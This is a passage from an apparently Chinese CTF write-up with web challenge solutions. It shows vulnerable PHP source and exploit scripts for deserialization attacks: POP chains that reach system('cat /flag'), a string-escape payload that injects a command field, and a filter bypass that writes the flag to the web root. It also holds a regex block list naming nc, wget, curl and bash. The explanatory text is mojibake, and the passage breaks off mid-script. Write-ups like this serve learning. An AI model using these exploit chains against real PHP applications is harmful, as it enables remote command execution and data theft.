        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§¦å‘CTFç±»çš„end()æ–¹æ³•</span>

    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Super</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Handle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§¦å‘Handleç±»çš„__callæ–¹æ³•</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">getStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"==GAME OVER=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">WhiteGod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§¦å‘WhiteGodç±»çš„__unset()æ–¹æ³•</span>

    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">-></span><span class="token property">log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">WhiteGod</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token operator">=</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">;</span>
    
<span class="token comment">/*
    public function __unset($var)
    &#123;
        ($this->func)($this->var);    
    &#125;

*/</span>

<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/7f0db6a827154668acf8b1903b310613.png" alt="456"></p>
<h3 id="R-C-E-2"><a href="#R-C-E-2" class="headerlink" title="R!!!C!!!E!!!!"></a>R!!!C!!!E!!!!</h3><p>å­˜åœ¨éé¢„æœŸ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">minipop</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$qwejaskdjnlka</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"alright"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">qwejaskdjnlka</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//wanna try?</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">minipop</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$qwejaskdjnlka</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">minipop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">code</span><span class="token operator">=</span><span class="token string double-quoted-string">"cat /flag_is_h3eeere | te''e /var/www/html/1"</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">qwejaskdjnlka</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åè®¿é—®&#x2F;1æ–‡ä»¶å¾—åˆ°flagã€‚</p>
<h2 id="week4-web"><a href="#week4-web" class="headerlink" title="week4-web"></a>week4-web</h2><h3 id="é€ƒ"><a href="#é€ƒ" class="headerlink" title="é€ƒ"></a>é€ƒ</h3><p>çŸ¥è¯†ç‚¹ï¼šå­—ç¬¦ä¸²é€ƒé€¸</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bad"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"good"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å½“ç»™keyéšä¾¿èµ‹ä¸€ä¸ªå€¼æ—¶</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bad"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"good"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'456789789'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//è¿è¡Œç»“æœï¼šO:7:"GetFlag":2:&#123;s:3:"key";s:9:"456789789";s:3:"cmd";s:6:"whoami";&#125;n0rt6\86159</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¦‚æœåé¢çš„<code>whoami</code>èƒ½å¤Ÿè®©æˆ‘ä»¬æ§åˆ¶æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œé‚£ç›®çš„å°±è¾¾åˆ°äº†ã€‚<br><code>&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code>æ€»å…±26ä¸ªå­—ç¬¦ï¼Œ<code>&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code>æ€»å…±29ä¸ªå­—ç¬¦ã€‚<br>wafå‡½æ•°åŠŸèƒ½å¯ä»¥å°†badæ¢ä¸ºgoodï¼Œä¹Ÿå°±å¢åŠ äº†ä¸€ä¸ªå­—ç¬¦ã€‚<br>é‚£ä¹ˆä½¿ç”¨29ä¸ªå­—ç¬¦å°±æ˜¯ç”¨29ä¸ªbadï¼Œæ­£å¥½æŠŠ<code>&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code>é¡¶å‡ºå»äº†ï¼Œä»è€Œè¾¾åˆ°æ‰§è¡Œå‘½ä»¤çš„æ•ˆæœ<br>expï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bad"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"good"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";&#125;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/38746d4f57ca42c7934536d2694d8579.png" alt="123"></p>
<h3 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h3><p>çŸ¥è¯†ç‚¹ï¼šååºåˆ—åŒ–ã€GCå›æ”¶</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$errMsg</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">errMsg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pwn</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Reverse</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Web</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Not Flag"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$wel</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token property">good</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"NewStar"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"good job but nothing"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fast'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nope"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ‰¾å…¥å£ï¼š<code>__destruct()</code><br>æ‰¾å‡ºå£ï¼š<code>evil()</code><br>é“¾å­ï¼š</p>
<blockquote>
<p><code>Start-&gt;Crypto-&gt;Reverse-&gt;Pwn-&gt;Web</code></p>
</blockquote>
<p>è¦ç»•è¿‡<code>throw new Exception(&quot;Nope&quot;);</code>ï¼Œè¿™é‡Œthrowå°±æ˜¯GCå›æ”¶ã€‚<br>åœ¨phpä¸­ï¼Œå½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨__destruct()æ–¹æ³•ï¼Œä½†å¦‚æœç¨‹åºæŠ¥é”™æˆ–è€…æŠ›å‡ºå¼‚å¸¸ï¼Œå°±ä¸ä¼šè§¦å‘è¯¥é­”æœ¯æ–¹æ³•ã€‚<br>å½“ä¸€ä¸ªç±»åˆ›å»ºä¹‹åå®ƒä¼šè‡ªå·±æ¶ˆå¤±ï¼Œè€Œ __destruct() é­”æœ¯æ–¹æ³•çš„è§¦å‘æ¡ä»¶å°±æ˜¯ä¸€ä¸ªç±»è¢«é”€æ¯æ—¶è§¦å‘ï¼Œè€Œthrowé‚£ä¸ªå‡½æ•°å°±æ˜¯å›æ”¶äº†è‡ªåŠ¨é”€æ¯çš„ç±»ï¼Œå¯¼è‡´destructæ£€æµ‹ä¸åˆ°æœ‰ä¸œè¥¿é”€æ¯ï¼Œä»è€Œä¹Ÿå°±å¯¼è‡´æ— æ³•è§¦å‘destructå‡½æ•°ã€‚<br>exp</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$errMsg</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pwn</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Reverse</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Web</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token operator">=</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"good job but nothing"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$p</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$r</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$w</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
